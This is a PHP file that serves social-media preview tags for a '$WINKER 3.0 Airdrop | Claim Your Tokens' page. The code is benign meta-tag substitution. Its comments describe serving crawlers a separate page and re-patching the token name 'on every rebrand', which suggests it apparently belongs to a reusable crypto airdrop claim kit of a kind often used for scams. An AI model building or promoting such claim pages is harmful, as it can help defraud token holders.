
<?php
// ── og.php — Universal Social Preview Injector ──────────────────────────────
// Reads the real domain at request-time and injects absolute OG/Twitter URLs.
// Called by rewrite rules — only bots hit this. Real users get index.html.
// update-theme.html patches $title/$desc/$alt/$name automatically on rebrand.
// ─────────────────────────────────────────────────────────────────────────────

$proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host  = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
$base  = $proto . '://' . $host;
$img   = $base . '/site_preview.png';
$url   = $base . '/';

// ── Token info — auto-patched by update-theme.html on every rebrand ──
$title = '$WINKER 3.0 Airdrop | Claim Your Tokens';
$desc  = 'The $WINKER 3.0 Airdrop is Live. Eligible users are invited to take part in the distribution of $WINKER 3.0 tokens.';
$alt   = '$WINKER 3.0 Airdrop - Claim Your Tokens';
$name  = '$WINKER 3.0';

// ── Load index.html and swap relative paths with absolute ────────────
$html = file_get_contents(__DIR__ . '/index.html');

$html = preg_replace('/<meta\s+name="description"\s+content="[^"]*"/i',
    '<meta name="description" content="' . htmlspecialchars($desc, ENT_QUOTES) . '"', $html);
$html = preg_replace('/<meta\s+property="og:title"\s+content="[^"]*"/i',
    '<meta property="og:title" content="' . htmlspecialchars($title, ENT_QUOTES) . '"', $html);
$html = preg_replace('/<meta\s+property="og:description"\s+content="[^"]*"/i',
    '<meta property="og:description" content="' . htmlspecialchars($desc, ENT_QUOTES) . '"', $html);
$html = preg_replace('/<meta\s+property="og:site_name"\s+content="[^"]*"/i',
    '<meta property="og:site_name" content="' . htmlspecialchars($name, ENT_QUOTES) . '"', $html);
$html = preg_replace('/<meta\s+property="og:image"\s+content="[^"]*"/i',
    '<meta property="og:image" content="' . htmlspecialchars($img, ENT_QUOTES) . '"', $html);
$html = preg_replace('/<meta\s+property="og:image:secure_url"\s+content="[^"]*"/i',
    '<meta property="og:image:secure_url" content="' . htmlspecialchars($img, ENT_QUOTES) . '"', $html);
$html = preg_replace('/<meta\s+property="og:image:alt"\s+content="[^"]*"/i',
    '<meta property="og:image:alt" content="' . htmlspecialchars($alt, ENT_QUOTES) . '"', $html);
$html = preg_replace('/<meta\s+property="og:url"\s+content="[^"]*"/i',
    '<meta property="og:url" content="' . htmlspecialchars($url, ENT_QUOTES) . '"', $html);
$html = preg_replace('/<meta\s+name="twitter:title"\s+content="[^"]*"/i',
    '<meta name="twitter:title" content="' . htmlspecialchars($title, ENT_QUOTES) . '"', $html);
$html = preg_replace('/<meta\s+name="twitter:description"\s+content="[^"]*"/i',
    '<meta name="twitter:description" content="' . htmlspecialchars($desc, ENT_QUOTES) . '"', $html);
$html = preg_replace('/<meta\s+name="twitter:image"\s+content="[^"]*"/i',
    '<meta name="twitter:image" content="' . htmlspecialchars($img, ENT_QUOTES) . '"', $html);
$html = preg_replace('/<meta\s+name="twitter:image:alt"\s+content="[^"]*"/i',
    '<meta name="twitter:image:alt" content="' . htmlspecialchars($alt, ENT_QUOTES) . '"', $html);

header('Content-Type: text/html; charset=utf-8');
echo $html;
